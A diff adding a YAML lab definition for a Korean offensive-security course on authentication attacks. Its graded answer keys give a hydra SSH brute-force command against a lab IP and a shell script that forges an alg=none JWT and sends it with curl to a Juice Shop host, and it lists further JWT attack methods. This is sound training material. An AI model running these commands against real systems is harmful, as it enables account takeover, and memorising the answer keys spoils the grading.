@@ -1,0 +1,72 @@
+lab_id: standalone-attack-week06
+title: 인증 + 접근제어 (hydra / JWT / IDOR)
+version: standalone-non-ai
+course: attack
+week: 6
+description: A01 + A07 — hydra brute / JWT alg=none / IDOR / session.
+difficulty: medium
+duration_minutes: 150
+prerequisites: [W05]
+objectives: [hydra brute, JWT 우회, IDOR]
+pass_threshold: 0.7
+steps:
+  - order: 1
+    instruction: hydra SSH brute (제한)
+    hint: hydra -L users.txt -P pass.txt 10.20.30.201 ssh
+    category: exploit
+    points: 25
+    answer: |
+      ssh 6v6-attacker '
+      echo -e "admin\nccc\nroot" > /tmp/users.txt
+      echo -e "ccc\nadmin\npassword\n1" > /tmp/pass.txt
+      timeout 15 hydra -L /tmp/users.txt -P /tmp/pass.txt -t 1 -f 10.20.30.201 ssh -s 22 2>&1 | tail -10
+      '
+    answer_detail: hydra 결과
+    verify:
+      type: output_contains
+      expect: ssh
+      field: stdout
+      semantic:
+        intent: hydra brute
+        success_criteria: [hydra 실행]
+        acceptable_methods:
+          - "**[OSS] hydra -L -P SSH brute**"
+          - "**[OSS] -t thread / -f stop on first**"
+          - "**[OSS] -e nsr null/same/reverse**"
+          - "**[OSS] HTTP post form -H Host**"
+          - "**[OSS] medusa 대안**"
+          - "**[OSS] patator 모던 대안**"
+          - "**[OSS] Wazuh rule 5710/5712 detection**"
+          - "**[OSS] fail2ban / Active Response 대응**"
+    target_vm: attacker
+
+  - order: 2
+    instruction: JWT alg=none 변조
+    hint: echo "{\"alg\":\"none\"}" | base64
+    category: exploit
+    points: 25
+    answer: |
+      ssh 6v6-attacker '
+      H=$(echo -n "{\"alg\":\"none\",\"typ\":\"JWT\"}" | base64 -w0 | tr "+/" "-_" | tr -d "=")
+      P=$(echo -n "{\"user\":\"admin\",\"role\":\"admin\"}" | base64 -w0 | tr "+/" "-_" | tr -d "=")
+      echo "변조 JWT: $H.$P."
+      curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer $H.$P." -H "Host: juice.6v6.lab" http://10.20.30.1/rest/user/whoami
+      '
+    answer_detail: alg=none JWT + 응답
+    verify:
+      type: output_contains
+      expect: JWT
+      field: stdout
+      semantic:
+        intent: JWT 우회
+        success_criteria: [JWT 변조]
+        acceptable_methods:
+          - "**[OSS] base64 + alg=none 변조**"
+          - "**[OSS] jwt_tool 자동화**"
+          - "**[OSS] HS256 secret brute (hashcat -m 16500)**"
+          - "**[OSS] RS256 + key confusion 공격**"
+          - "**[OSS] kid header path traversal**"
+          - "**[OSS] payload exp/iat 변조**"
+          - "**[OSS] JuiceShop challenge 의 JWT 우회**"
+          - "**[OSS] 운영 권장 — strict alg list**"
+    target_vm: attacker
